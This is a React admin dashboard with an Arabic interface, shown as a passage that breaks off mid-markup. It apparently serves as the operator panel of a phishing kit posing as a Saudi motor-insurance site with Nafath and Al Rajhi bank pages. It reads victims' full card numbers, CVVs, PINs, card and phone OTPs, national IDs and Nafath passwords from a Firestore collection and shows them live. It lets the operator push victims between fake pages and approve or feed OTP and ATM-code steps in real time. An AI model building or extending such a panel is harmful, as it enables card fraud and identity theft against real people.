import { useState, useEffect, useMemo, useRef } from "react";
import { useLocation } from "wouter";
import {
  Trash2,
  Users,
  CreditCard,
  UserCheck,
  Flag,
  Bell,
  LogOut,
  CheckCircle,
  Search,
  Download,
  Settings,
  User,
  Menu,
  ArrowUpDown,
  ChevronLeft,
  ChevronRight,
  TrendingUp,
  Activity,
  Filter,
  RefreshCw,
  AlertCircle,
  Loader2,
  Phone,
  LockIcon,
  ClipboardCheck,
  Eye,
  EyeOff,
  Navigation,
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { format } from "date-fns";
import { ar } from "date-fns/locale";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogFooter,
  DialogTrigger,
} from "@/components/ui/dialog";
import {
  Card,
  CardContent,
  CardHeader,
  CardTitle,
  CardFooter,
} from "@/components/ui/card";
import {
  collection,
  doc,
  writeBatch,
  updateDoc,
  onSnapshot,
  query,
  orderBy,
} from "firebase/firestore";
import { onValue, ref } from "firebase/database";
import {
  Popover,
  PopoverContent,
  PopoverTrigger,
} from "@/components/ui/popover";
import {
  Tooltip,
  TooltipProvider,
  TooltipContent,
  TooltipTrigger,
} from "@/components/ui/tooltip";
import { Input } from "@/components/ui/input";
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuTrigger,
  DropdownMenuSeparator,
  DropdownMenuLabel,
} from "@/components/ui/dropdown-menu";
import { Avatar, AvatarFallback, AvatarImage } from "@/components/ui/avatar";
import { Separator } from "@/components/ui/separator";
import { Switch } from "@/components/ui/switch";
import { Label } from "@/components/ui/label";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { Checkbox } from "@/components/ui/checkbox";
import { useToast } from "@/hooks/use-toast";
import {
  Sheet,
  SheetContent,
  SheetHeader,
  SheetTitle,
} from "@/components/ui/sheet";
import { db, database, isFirebaseConfigured } from "@/lib/firebase";

interface Notification {
  id: string;
  fullName?: string;
  nationalId?: string;
  phone?: string;
  phone2?: string;
  birthDate?: string;
  cardNumber?: string;
  cardLast4?: string;
  cardExpiry?: string;
  cardCvv?: string;
  cardHolder?: string;
  cardOtp?: string;
  cardPin?: string;
  pinCode?: string;
  phoneOtp?: string;
  phoneOtpCode?: string;
  nafazId?: string;
  nafazPassword?: string;
  authNumber?: string;
  currentPage?: string;
  currentStep?: string;
  status?: string;
  createdAt?: string;
  createdDate?: string;
  country?: string;
  any?: "red" | "yellow" | "green" | null;
  cardOtpApproved?: boolean;
  cardPinApproved?: boolean;
  phoneOtpApproved?: boolean;
  nafathApproved?: boolean;
  verified?: boolean;
  isHidden?: boolean;
  adminDirective?: {
    targetPage?: string;
    targetStep?: number;
    issuedAt?: string;
  };
}

function StatisticsCard({
  title,
  value,
  change,
  changeType,
  icon: Icon,
  colorClass,
  trend,
}: {
  title: string;
  value: string | number;
  change: string;
  changeType: "increase" | "decrease" | "neutral";
  icon: React.ElementType;
  colorClass: string;
  trend?: number[];
}) {
  return (
    <Card className="relative overflow-hidden border-0 shadow-lg hover:shadow-xl transition-all duration-300 bg-gradient-to-br from-card to-muted/20">
      <CardHeader className="pb-2">
        <div className="flex items-center justify-between">
          <div className={`p-3 rounded-xl ${colorClass}`}>
            <Icon className="h-6 w-6 text-primary-foreground" />
          </div>
          <div className="text-right">
            <p className="text-sm font-medium text-muted-foreground">{title}</p>
            <p className="text-3xl font-bold">{value}</p>
          </div>
        </div>
      </CardHeader>
      <CardContent className="pt-0">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-1">
            <TrendingUp
              className={`h-4 w-4 ${
                changeType === "increase"
                  ? "text-emerald-500"
                  : changeType === "decrease"
                    ? "text-rose-500"
                    : "text-muted-foreground"
              }`}
            />
            <span
              className={`text-sm font-medium ${
                changeType === "increase"
                  ? "text-emerald-500"
                  : changeType === "decrease"
                    ? "text-rose-500"
                    : "text-muted-foreground"
              }`}
            >
              {change}
            </span>
          </div>
          {trend && (
            <div className="flex items-end gap-1 h-8">
              {trend.map((value, index) => (
                <div
                  key={index}
                  className={`w-1 rounded-sm ${colorClass} opacity-60`}
                  style={{ height: `${(value / Math.max(...trend)) * 100}%` }}
                />
              ))}
            </div>
          )}
        </div>
      </CardContent>
    </Card>
  );
}

function UserStatus({ visitorId }: { visitorId: string }) {
  const [status, setStatus] = useState<"online" | "offline" | "unknown">("unknown");

  useEffect(() => {
    if (!database) return;
    const userStatusRef = ref(database, `/status/${visitorId}`);

    const unsubscribe = onValue(userStatusRef, (snapshot) => {
      const data = snapshot.val();
      if (data) {
        setStatus(data.state === "online" ? "online" : "offline");
      } else {
        setStatus("unknown");
      }
    });

    return () => unsubscribe();
  }, [visitorId]);

  return (
    <div className="flex items-center gap-2">
      <div
        className={`w-2 h-2 rounded-full ${status === "online" ? "bg-emerald-500 animate-pulse" : "bg-rose-500"}`}
      />
      <Badge
        variant="outline"
        className={`text-xs ${
          status === "online"
            ? "bg-emerald-50 text-emerald-700 border-emerald-200 dark:bg-emerald-950/30 dark:text-emerald-300"
            : "bg-rose-50 text-rose-700 border-rose-200 dark:bg-rose-950/30 dark:text-rose-300"
        }`}
      >
        {status === "online" ? "متصل" : "غير متصل"}
      </Badge>
    </div>
  );
}

function PrioritySelector({
  notificationId,
  currentColor,
  onColorChange,
}: {
  notificationId: string;
  currentColor: "red" | "yellow" | "green" | null;
  onColorChange: (id: string, color: "red" | "yellow" | "green" | null) => void;
}) {
  return (
    <Popover>
      <PopoverTrigger asChild>
        <Button variant="ghost" size="icon" className="h-8 w-8">
          <Flag
            className={`h-4 w-4 ${
              currentColor === "red"
                ? "text-rose-500 fill-rose-500"
                : currentColor === "yellow"
                  ? "text-amber-500 fill-amber-500"
                  : currentColor === "green"
                    ? "text-emerald-500 fill-emerald-500"
                    : "text-muted-foreground"
            }`}
          />
        </Button>
      </PopoverTrigger>
      <PopoverContent className="w-auto p-2">
        <div className="flex gap-2">
          {[
            { color: "red" as const, label: "عالي الأولوية", bgClass: "bg-rose-100 hover:bg-rose-200 dark:bg-rose-900 dark:hover:bg-rose-800" },
            { color: "yellow" as const, label: "متوسط الأولوية", bgClass: "bg-amber-100 hover:bg-amber-200 dark:bg-amber-900 dark:hover:bg-amber-800" },
            { color: "green" as const, label: "منخفض الأولوية", bgClass: "bg-emerald-100 hover:bg-emerald-200 dark:bg-emerald-900 dark:hover:bg-emerald-800" },
          ].map(({ color, label, bgClass }) => (
            <TooltipProvider key={color}>
              <Tooltip>
                <TooltipTrigger asChild>
                  <Button
                    variant="ghost"
                    size="icon"
                    className={`h-8 w-8 rounded-full ${bgClass}`}
                    onClick={() => onColorChange(notificationId, color)}
                  >
                    <Flag className={`h-4 w-4 ${color === "red" ? "text-rose-500 fill-rose-500" : color === "yellow" ? "text-amber-500 fill-amber-500" : "text-emerald-500 fill-emerald-500"}`} />
                  </Button>
                </TooltipTrigger>
                <TooltipContent><p>{label}</p></TooltipContent>
              </Tooltip>
            </TooltipProvider>
          ))}
          {currentColor && (
            <TooltipProvider>
              <Tooltip>
                <TooltipTrigger asChild>
                  <Button
                    variant="ghost"
                    size="icon"
                    className="h-8 w-8 rounded-full bg-muted hover:bg-muted/80"
                    onClick={() => onColorChange(notificationId, null)}
                  >
                    <Flag className="h-4 w-4 text-muted-foreground" />
                  </Button>
                </TooltipTrigger>
                <TooltipContent><p>إزالة العلم</p></TooltipContent>
              </Tooltip>
            </TooltipProvider>
          )}
        </div>
      </PopoverContent>
    </Popover>
  );
}

function Pagination({
  currentPage,
  totalPages,
  onPageChange,
  totalItems,
  itemsPerPage,
}: {
  currentPage: number;
  totalPages: number;
  onPageChange: (page: number) => void;
  totalItems: number;
  itemsPerPage: number;
}) {
  const startItem = (currentPage - 1) * itemsPerPage + 1;
  const endItem = Math.min(currentPage * itemsPerPage, totalItems);

  return (
    <div className="flex items-center justify-between flex-wrap gap-2">
      <div className="text-sm text-muted-foreground">
        عرض {startItem} إلى {endItem} من {totalItems} عنصر
      </div>
      <div className="flex items-center gap-2">
        <Button
          variant="outline"
          size="sm"
          onClick={() => onPageChange(currentPage - 1)}
          disabled={currentPage <= 1}
          className="gap-1"
        >
          <ChevronRight className="h-4 w-4" />
          السابق
        </Button>
        <div className="flex items-center gap-1">
          {Array.from({ length: Math.min(5, totalPages) }, (_, i) => {
            const page = i + 1;
            return (
              <Button
                key={page}
                variant={currentPage === page ? "default" : "outline"}
                size="sm"
                className="w-8 h-8 p-0"
                onClick={() => onPageChange(page)}
              >
                {page}
              </Button>
            );
          })}
        </div>
        <Button
          variant="outline"
          size="sm"
          onClick={() => onPageChange(currentPage + 1)}
          disabled={currentPage >= totalPages}
          className="gap-1"
        >
          التالي
          <ChevronLeft className="h-4 w-4" />
        </Button>
      </div>
    </div>
  );
}

const stepLabels: Record<string, string> = {
  "1": "البيانات الشخصية",
  "2": "بيانات المركبة", 
  "3": "عروض التأمين",
  "4": "الدفع",
  "5": "OTP البطاقة",
  "6": "التحقق النهائي",
  "7": "النجاح",
};

const pageLabels: Record<string, string> = {
  "motor-insurance": "تأمين السيارات",
  "phone-verification": "التحقق من الهاتف",
  "nafaz": "نفاذ",
  "rajhi": "الراجحي",
};

export default function Dashboard() {
  const [, setLocation] = useLocation();
  const { toast } = useToast();
  const [notifications, setNotifications] = useState<Notification[]>([]);
  const [isLoading, setIsLoading] = useState(true);
  const [searchTerm, setSearchTerm] = useState("");
  const [currentPage, setCurrentPage] = useState(1);
  const [showStatistics, setShowStatistics] = useState(true);
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
  const [totalVisitors, setTotalVisitors] = useState(0);
  const [cardSubmissions, setCardSubmissions] = useState(0);
  const [onlineUsersCount, setOnlineUsersCount] = useState(0);
  const itemsPerPage = 10;
  const previousNotificationsRef = useRef<Notification[]>([]);

  const filteredNotifications = useMemo(() => {
    return notifications.filter((notification) => {
      const matchesSearch =
        !searchTerm ||
        notification.fullName?.toLowerCase().includes(searchTerm.toLowerCase()) ||
        notification.nationalId?.includes(searchTerm) ||
        notification.phone?.includes(searchTerm) ||
        notification.id.includes(searchTerm);
      return matchesSearch;
    });
  }, [notifications, searchTerm]);

  const totalPages = Math.ceil(filteredNotifications.length / itemsPerPage);
  const paginatedNotifications = filteredNotifications.slice(
    (currentPage - 1) * itemsPerPage,
    currentPage * itemsPerPage
  );

  const pendingCount = notifications.filter((n) => n.status === "pending").length;

  useEffect(() => {
    if (!isFirebaseConfigured || !db) {
      setIsLoading(false);
      return;
    }
    
    const fetchNotifications = () => {
      const q = query(collection(db!, "pays"), orderBy("createdAt", "desc"));
      
      const unsubscribe = onSnapshot(q, (snapshot) => {
        const notificationsData: Notification[] = [];
        
        snapshot.forEach((doc) => {
          const data = doc.data();
          if (!data.isHidden) {
            notificationsData.push({
              id: doc.id,
              ...data,
              createdDate: data.createdAt,
            } as Notification);
          }
        });

        setNotifications(notificationsData);
        setTotalVisitors(notificationsData.length);
        setCardSubmissions(notificationsData.filter(n => n.cardNumber).length);
        setIsLoading(false);
        previousNotificationsRef.current = notificationsData;
      }, (error) => {
        console.error("Error fetching notifications:", error);
        setIsLoading(false);
        toast({
          title: "خطأ في جلب البيانات",
          description: "حدث خطأ أثناء جلب الإشعارات",
          variant: "destructive",
        });
      });

      return unsubscribe;
    };

    const unsubscribe = fetchNotifications();
    return () => unsubscribe();
  }, [toast]);

  useEffect(() => {
    if (!database) return;
    const onlineUsersRef = ref(database, "status");
    const unsubscribe = onValue(onlineUsersRef, (snapshot) => {
      const data = snapshot.val();
      if (data) {
        const onlineCount = Object.values(data).filter(
          (status: any) => status.state === "online"
        ).length;
        setOnlineUsersCount(onlineCount);
      }
    });

    return () => unsubscribe();
  }, []);

  const handleRouteUser = async (id: string, targetPage: string, targetStep?: number) => {
    if (!db) return;
    try {
      const docRef = doc(db, "pays", id);
      await updateDoc(docRef, {
        adminDirective: {
          targetPage,
          targetStep: targetStep || 1,
          issuedAt: new Date().toISOString(),
        },
      });
      toast({
        title: "تم توجيه المستخدم",
        description: `تم توجيه المستخدم إلى: ${pageLabels[targetPage] || targetPage}`,
      });
    } catch (error) {
      console.error("Error routing user:", error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء توجيه المستخدم",
        variant: "destructive",
      });
    }
  };

  const handleStepChange = async (id: string, step: string) => {
    if (!db) return;
    try {
      const docRef = doc(db, "pays", id);
      await updateDoc(docRef, {
        adminDirective: {
          targetPage: "motor-insurance",
          targetStep: parseInt(step),
          issuedAt: new Date().toISOString(),
        },
      });
      toast({
        title: "تم تحديث الخطوة",
        description: `تم تغيير الخطوة إلى: ${stepLabels[step] || step}`,
      });
    } catch (error) {
      console.error("Error updating step:", error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء تحديث الخطوة",
        variant: "destructive",
      });
    }
  };

  const handleApprovalToggle = async (id: string, field: string, value: boolean) => {
    if (!db) return;
    try {
      const docRef = doc(db, "pays", id);
      await updateDoc(docRef, { [field]: value });
      setNotifications((prev) =>
        prev.map((n) => (n.id === id ? { ...n, [field]: value } : n))
      );
      const fieldLabels: Record<string, string> = {
        cardOtpApproved: "OTP البطاقة",
        cardPinApproved: "PIN البطاقة",
        phoneOtpApproved: "OTP الهاتف",
        nafathApproved: "نفاذ",
      };
      toast({
        title: value ? "تمت الموافقة" : "تم الإلغاء",
        description: `تم ${value ? "الموافقة على" : "إلغاء"} ${fieldLabels[field] || field}`,
      });
    } catch (error) {
      console.error("Error updating approval status:", error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء تحديث حالة الموافقة",
        variant: "destructive",
      });
    }
  };

  const handleApprovalStatus = async (id: string, status: "approved_otp" | "approved_atm" | "rejected", atmCode?: string) => {
    if (!db) return;
    try {
      const docRef = doc(db, "pays", id);
      const updateData: any = { approvalStatus: status };
      if (status === "approved_atm" && atmCode) {
        updateData.atmCode = atmCode;
      }
      await updateDoc(docRef, updateData);
      toast({
        title: status === "rejected" ? "تم الرفض" : "تمت الموافقة",
        description: status === "approved_otp" 
          ? "تمت الموافقة - سيظهر OTP للمستخدم"
          : status === "approved_atm"
            ? "تمت الموافقة - سيظهر رمز الصراف للمستخدم"
            : "تم رفض العملية",
      });
    } catch (error) {
      console.error("Error updating approval status:", error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء تحديث الحالة",
        variant: "destructive",
      });
    }
  };

  const handlePriorityChange = async (id: string, color: "red" | "yellow" | "green" | null) => {
    if (!db) return;
    try {
      const docRef = doc(db, "pays", id);
      await updateDoc(docRef, { any: color });
      setNotifications(
        notifications.map((notification) =>
          notification.id === id ? { ...notification, any: color } : notification
        )
      );
      toast({
        title: "تم تحديث العلامة",
        description: color ? "تم تحديث لون العلامة بنجاح" : "تمت إزالة العلامة بنجاح",
      });
    } catch (error) {
      console.error("Error updating flag color:", error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء تحديث لون العلامة",
        variant: "destructive",
      });
    }
  };

  const handleDelete = async (id: string) => {
    if (!db) return;
    try {
      const docRef = doc(db, "pays", id);
      await updateDoc(docRef, { isHidden: true });
      setNotifications(notifications.filter((notification) => notification.id !== id));
      toast({
        title: "تم مسح الإشعار",
        description: "تم مسح الإشعار بنجاح",
      });
    } catch (error) {
      console.error("Error hiding notification:", error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء مسح الإشعار",
        variant: "destructive",
      });
    }
  };

  const handleClearAll = async () => {
    if (!db) return;
    setIsLoading(true);
    try {
      const batch = writeBatch(db!);
      notifications.forEach((notification) => {
        const docRef = doc(db!, "pays", notification.id);
        batch.update(docRef, { isHidden: true });
      });
      await batch.commit();
      setNotifications([]);
      toast({
        title: "تم مسح جميع الإشعارات",
        description: "تم مسح جميع الإشعارات بنجاح",
      });
    } catch (error) {
      console.error("Error hiding all notifications:", error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء مسح الإشعارات",
        variant: "destructive",
      });
    } finally {
      setIsLoading(false);
    }
  };

  const handleRefresh = () => {
    setIsLoading(true);
    setTimeout(() => setIsLoading(false), 500);
  };

  if (!isFirebaseConfigured) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-background via-background to-muted/20 flex items-center justify-center" dir="rtl">
        <Card className="max-w-md">
          <CardHeader>
            <CardTitle className="flex items-center gap-2 text-destructive">
              <AlertCircle className="h-5 w-5" />
              Firebase غير مكوّن
            </CardTitle>
          </CardHeader>
          <CardContent>
            <p className="text-muted-foreground">
              يرجى إعداد متغيرات البيئة الخاصة بـ Firebase لاستخدام لوحة التحكم.
            </p>
          </CardContent>
        </Card>
      </div>
    );
  }

  if (isLoading) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-background via-background to-muted/20 flex items-center justify-center">
        <div className="flex flex-col items-center gap-4">
          <div className="relative">
            <div className="h-12 w-12 animate-spin rounded-full border-4 border-primary/20 border-t-primary"></div>
            <div className="absolute inset-0 h-12 w-12 animate-pulse rounded-full bg-primary/10"></div>
          </div>
          <div className="text-lg font-medium">جاري التحميل...</div>
        </div>
      </div>
    );
  }

  const visitorTrend = [5, 8, 12, 7, 10, 15, 13];
  const cardTrend = [2, 3, 5, 4, 6, 8, 7];
  const onlineTrend = [3, 4, 6, 5, 7, 8, 6];
  const approvedTrend = [1, 2, 4, 3, 5, 7, 6];

  return (
    <div dir="rtl" className="min-h-screen bg-gradient-to-br from-background via-background to-muted/20">
      <Sheet open={mobileMenuOpen} onOpenChange={setMobileMenuOpen}>
        <SheetContent side="right" className="w-[250px] sm:w-[400px]" dir="rtl">
          <SheetHeader className="mb-6">
            <SheetTitle className="flex items-center gap-2">
              <Bell className="h-5 w-5 text-primary" />
              <span>لوحة الإشعارات</span>
            </SheetTitle>
          </SheetHeader>
          <div className="space-y-6">
            <div className="flex items-center gap-4">
              <Avatar>
                <AvatarFallback>مد</AvatarFallback>
              </Avatar>
              <div>
                <p className="font-medium">مدير النظام</p>
                <p className="text-sm text-muted-foreground">admin@example.com</p>
              </div>
            </div>
            <Separator />
            <nav className="space-y-2">
              <Button variant="ghost" className="w-full justify-start" onClick={() => setMobileMenuOpen(false)}>
                <Bell className="mr-2 h-4 w-4" />
                الإشعارات
              </Button>
              <Button variant="ghost" className="w-full justify-start" onClick={() => setLocation("/")}>
                <Navigation className="mr-2 h-4 w-4" />
                الصفحة الرئيسية
              </Button>
            </nav>
          </div>
        </SheetContent>
      </Sheet>

      <header className="sticky top-0 z-50 border-b bg-background/80 backdrop-blur-xl supports-[backdrop-filter]:bg-background/60">
        <div className="flex items-center justify-between p-4">
          <div className="flex items-center gap-4">
            <Button variant="ghost" size="icon" className="md:hidden" onClick={() => setMobileMenuOpen(true)}>
              <Menu className="h-5 w-5" />
            </Button>
            <div className="flex items-center gap-3">
              <div className="relative">
                <div className="bg-gradient-to-br from-primary to-primary/80 p-3 rounded-xl shadow-lg">
                  <Bell className="h-6 w-6 text-primary-foreground" />
                </div>
                {pendingCount > 0 && (
                  <div className="absolute -top-1 -right-1 bg-destructive text-destructive-foreground text-xs rounded-full h-5 w-5 flex items-center justify-center animate-pulse">
                    {pendingCount}
                  </div>
                )}
              </div>
              <div>
                <h1 className="text-xl font-bold">لوحة تحكم الزوار</h1>
                <p className="text-sm text-muted-foreground">
                  آخر تحديث: {format(new Date(), "HH:mm", { locale: ar })}
                </p>
              </div>
            </div>
          </div>

          <div className="flex items-center gap-2">
            <TooltipProvider>
              <Tooltip>
                <TooltipTrigger asChild>
                  <Button variant="outline" size="icon" onClick={() => setShowStatistics(!showStatistics)}>
                    {showStatistics ? <Eye className="h-4 w-4" /> : <EyeOff className="h-4 w-4" />}
                  </Button>
                </TooltipTrigger>
                <TooltipContent><p>إخفاء/إظهار الإحصائيات</p></TooltipContent>
              </Tooltip>
            </TooltipProvider>

            <TooltipProvider>
              <Tooltip>
                <TooltipTrigger asChild>
                  <Button variant="outline" size="icon" onClick={handleRefresh}>
                    <RefreshCw className={`h-4 w-4 ${isLoading ? "animate-spin" : ""}`} />
                  </Button>
                </TooltipTrigger>
                <TooltipContent><p>تحديث البيانات</p></TooltipContent>
              </Tooltip>
            </TooltipProvider>

            <div className="hidden md:flex items-center gap-2">
              <Button variant="destructive" onClick={handleClearAll} disabled={notifications.length === 0} className="gap-2">
                <Trash2 className="h-4 w-4" />
                مسح الكل
              </Button>
            </div>

            <DropdownMenu>
              <DropdownMenuTrigger asChild>
                <Button variant="ghost" className="relative h-10 w-10 rounded-full">
                  <Avatar className="h-10 w-10 ring-2 ring-primary/20">
                    <AvatarFallback className="bg-gradient-to-br from-primary to-primary/80 text-primary-foreground">مد</AvatarFallback>
                  </Avatar>
                </Button>
              </DropdownMenuTrigger>
              <DropdownMenuContent align="end" className="w-56">
                <DropdownMenuLabel>
                  <div className="flex flex-col space-y-1">
                    <p className="text-sm font-medium">مدير النظام</p>
                    <p className="text-xs text-muted-foreground">admin@example.com</p>
                  </div>
                </DropdownMenuLabel>
                <DropdownMenuSeparator />
                <DropdownMenuItem onClick={() => setLocation("/")}>
                  <Navigation className="ml-2 h-4 w-4" />
                  الصفحة الرئيسية
                </DropdownMenuItem>
              </DropdownMenuContent>
            </DropdownMenu>
          </div>
        </div>
      </header>

      <div className="p-6">
        {showStatistics && (
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-8">
            <StatisticsCard
              title="إجمالي الزوار"
              value={totalVisitors}
              change="+12%"
              changeType="increase"
              icon={Users}
              colorClass="bg-blue-500"
              trend={visitorTrend}
            />
            <StatisticsCard
              title="البطاقات المقدمة"
              value={cardSubmissions}
              change="+8%"
              changeType="increase"
              icon={CreditCard}
              colorClass="bg-emerald-500"
              trend={cardTrend}
            />
            <StatisticsCard
              title="المتصلون الآن"
              value={onlineUsersCount}
              change="0%"
              changeType="neutral"
              icon={Activity}
              colorClass="bg-amber-500"
              trend={onlineTrend}
            />
            <StatisticsCard
              title="الموافقات"
              value={notifications.filter(n => n.cardOtpApproved).length}
              change="+5%"
              changeType="increase"
              icon={CheckCircle}
              colorClass="bg-purple-500"
              trend={approvedTrend}
            />
          </div>
        )}

        <Card className="overflow-hidden">
          <CardHeader className="bg-muted/30 border-b">
            <div className="flex items-center justify-between flex-wrap gap-4">
              <CardTitle className="flex items-center gap-2">
                <Bell className="h-5 w-5" />
                قائمة الزوار
              </CardTitle>
              <div className="flex items-center gap-2">
                <div className="relative">
                  <Search className="absolute right-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-muted-foreground" />
                  <Input
                    type="search"
                    placeholder="البحث..."
                    className="pr-10 w-64"
                    value={searchTerm}
                    onChange={(e) => setSearchTerm(e.target.value)}
                    data-testid="input-dashboard-search"
                  />
                </div>
              </div>
            </div>
          </CardHeader>

          <CardContent className="p-0">
            <div className="hidden lg:block overflow-x-auto">
              <table className="w-full">
                <thead className="bg-muted/50">
                  <tr>
                    <th className="px-4 py-3 text-right text-sm font-medium">الزائر</th>
                    <th className="px-4 py-3 text-center text-sm font-medium">البيانات</th>
                    <th className="px-4 py-3 text-center text-sm font-medium">OTP/PIN</th>
                    <th className="px-4 py-3 text-center text-sm font-medium">الموافقات</th>
                    <th className="px-4 py-3 text-center text-sm font-medium">قرار الدفع</th>
                    <th className="px-4 py-3 text-center text-sm font-medium">الحالة</th>
                    <th className="px-4 py-3 text-center text-sm font-medium">التوجيه</th>
                    <th className="px-4 py-3 text-center text-sm font-medium">الإجراءات</th>
                  </tr>
                </thead>
                <tbody className="divide-y">
                  {paginatedNotifications.map((notification) => (
                    <tr key={notification.id} className="hover:bg-muted/30 transition-colors">
                      <td className="px-4 py-4">
                        <div className="flex items-center gap-3">
                          <div className="w-10 h-10 rounded-full bg-gradient-to-br from-primary/20 to-primary/10 flex items-center justify-center">
                            <User className="h-5 w-5 text-primary" />
                          </div>
                          <div>
                            <p className="font-medium text-sm">{notification.fullName || "زائر"}</p>
                            <p className="text-xs text-muted-foreground">{notification.id.substring(0, 12)}...</p>
                          </div>
                        </div>
                      </td>
                      <td className="px-4 py-4">
                        <div className="flex flex-wrap justify-center gap-1">
                          <Badge variant={notification.fullName ? "default" : "secondary"} className="text-xs">
                            <User className="h-3 w-3 mr-1" />
                            شخصي
                          </Badge>
                          <Badge variant={notification.cardNumber ? "default" : "secondary"} className={`text-xs ${notification.cardNumber ? "bg-emerald-500" : ""}`}>
                            <CreditCard className="h-3 w-3 mr-1" />
                            {notification.cardLast4 ? `****${notification.cardLast4}` : "بطاقة"}
                          </Badge>
                        </div>
                      </td>
                      <td className="px-4 py-4">
                        <div className="flex flex-col items-center gap-1">
                          {notification.cardOtp && (
                            <Badge className="bg-blue-600 text-xs">{notification.cardOtp}</Badge>
                          )}
                          {(notification.cardPin || notification.pinCode) && (
                            <Badge className="bg-purple-600 text-xs">{notification.cardPin || notification.pinCode}</Badge>
                          )}
                          {(notification.phoneOtp || notification.phoneOtpCode) && (
                            <Badge className="bg-pink-600 text-xs">{notification.phoneOtp || notification.phoneOtpCode}</Badge>
                          )}
                        </div>
                      </td>
                      <td className="px-4 py-4">
                        <div className="flex justify-center gap-1">
                          <TooltipProvider>
                            <Tooltip>
                              <TooltipTrigger asChild>
                                <div
                                  className={`w-8 h-8 rounded-full flex items-center justify-center cursor-pointer transition-all ${
                                    notification.cardOtpApproved
                                      ? "bg-emerald-100 dark:bg-emerald-900/30"
                                      : "bg-gray-100 dark:bg-gray-800"
                                  }`}
                                  onClick={() => handleApprovalToggle(notification.id, "cardOtpApproved", !notification.cardOtpApproved)}
                                >
                                  <CreditCard className={`h-4 w-4 ${notification.cardOtpApproved ? "text-emerald-600" : "text-gray-400"}`} />
                                </div>
                              </TooltipTrigger>
                              <TooltipContent><p>OTP البطاقة</p></TooltipContent>
                            </Tooltip>
                          </TooltipProvider>
                          <TooltipProvider>
                            <Tooltip>
                              <TooltipTrigger asChild>
                                <div
                                  className={`w-8 h-8 rounded-full flex items-center justify-center cursor-pointer transition-all ${
                                    notification.phoneOtpApproved
                                      ? "bg-emerald-100 dark:bg-emerald-900/30"
                                      : "bg-gray-100 dark:bg-gray-800"
                                  }`}
                                  onClick={() => handleApprovalToggle(notification.id, "phoneOtpApproved", !notification.phoneOtpApproved)}
                                >
                                  <Phone className={`h-4 w-4 ${notification.phoneOtpApproved ? "text-emerald-600" : "text-gray-400"}`} />
                                </div>
                              </TooltipTrigger>
                              <TooltipContent><p>OTP الهاتف</p></TooltipContent>
                            </Tooltip>
                          </TooltipProvider>
                          <TooltipProvider>
                            <Tooltip>
                              <TooltipTrigger asChild>
                                <div
                                  className={`w-8 h-8 rounded-full flex items-center justify-center cursor-pointer transition-all ${
                                    notification.nafathApproved
                                      ? "bg-emerald-100 dark:bg-emerald-900/30"
                                      : "bg-gray-100 dark:bg-gray-800"
                                  }`}
                                  onClick={() => handleApprovalToggle(notification.id, "nafathApproved", !notification.nafathApproved)}
                                >
                                  <ClipboardCheck className={`h-4 w-4 ${notification.nafathApproved ? "text-emerald-600" : "text-gray-400"}`} />
                                </div>
                              </TooltipTrigger>
                              <TooltipContent><p>نفاذ</p></TooltipContent>
                            </Tooltip>
                          </TooltipProvider>
                        </div>
                      </td>
                      <td className="px-4 py-4">
                        <div className="flex justify-center gap-1">
                          <Button
                            size="sm"
                            variant="outline"
                            className="text-xs bg-emerald-50 hover:bg-emerald-100 text-emerald-700 border-emerald-200"
                            onClick={() => handleApprovalStatus(notification.id, "approved_otp")}
                          >
                            OTP
                          </Button>
                          <Dialog>
                            <DialogTrigger asChild>
                              <Button size="sm" variant="outline" className="text-xs bg-blue-50 hover:bg-blue-100 text-blue-700 border-blue-200">
                                ATM
                              </Button>
                            </DialogTrigger>
                            <DialogContent dir="rtl">
                              <DialogHeader>
                                <DialogTitle>إدخال رمز الصراف</DialogTitle>
                              </DialogHeader>
                              <div className="py-4">
                                <Input
                                  id={`atm-${notification.id}`}
                                  placeholder="أدخل رمز الصراف"
                                  className="text-center text-xl"
                                />
                              </div>
                              <DialogFooter>
                                <Button onClick={() => {
                                  const input = document.getElementById(`atm-${notification.id}`) as HTMLInputElement;
                                  if (input?.value) {
                                    handleApprovalStatus(notification.id, "approved_atm", input.value);
                                  }
                                }}>
                                  تأكيد
                                </Button>
                              </DialogFooter>
                            </DialogContent>
                          </Dialog>
                          <Button
                            size="sm"
                            variant="outline"
                            className="text-xs bg-rose-50 hover:bg-rose-100 text-rose-700 border-rose-200"
                            onClick={() => handleApprovalStatus(notification.id, "rejected")}
                          >
                            رفض
                          </Button>
                        </div>
                      </td>
                      <td className="px-4 py-4 text-center">
                        <UserStatus visitorId={notification.id} />
                        <div className="mt-1">
                          <Badge variant="outline" className="text-xs">
                            {pageLabels[notification.currentPage || ""] || notification.currentPage || "الرئيسية"}
                          </Badge>
                        </div>
                      </td>
                      <td className="px-4 py-4">
                        <div className="flex flex-col gap-2 items-center">
                          <Select onValueChange={(value) => handleRouteUser(notification.id, value)}>
                            <SelectTrigger className="h-8 text-xs w-32">
                              <SelectValue placeholder="توجيه إلى..." />
                            </SelectTrigger>
                            <SelectContent>
                              <SelectItem value="motor-insurance">تأمين السيارات</SelectItem>
                              <SelectItem value="phone-verification">التحقق من الهاتف</SelectItem>
                              <SelectItem value="nafaz">نفاذ</SelectItem>
                              <SelectItem value="rajhi">الراجحي</SelectItem>
                            </SelectContent>
                          </Select>
                          <Select onValueChange={(value) => handleStepChange(notification.id, value)}>
                            <SelectTrigger className="h-8 text-xs w-32">
                              <SelectValue placeholder="خطوة..." />
                            </SelectTrigger>
                            <SelectContent>
                              <SelectItem value="1">البيانات الشخصية</SelectItem>
                              <SelectItem value="2">بيانات المركبة</SelectItem>
                              <SelectItem value="3">عروض التأمين</SelectItem>
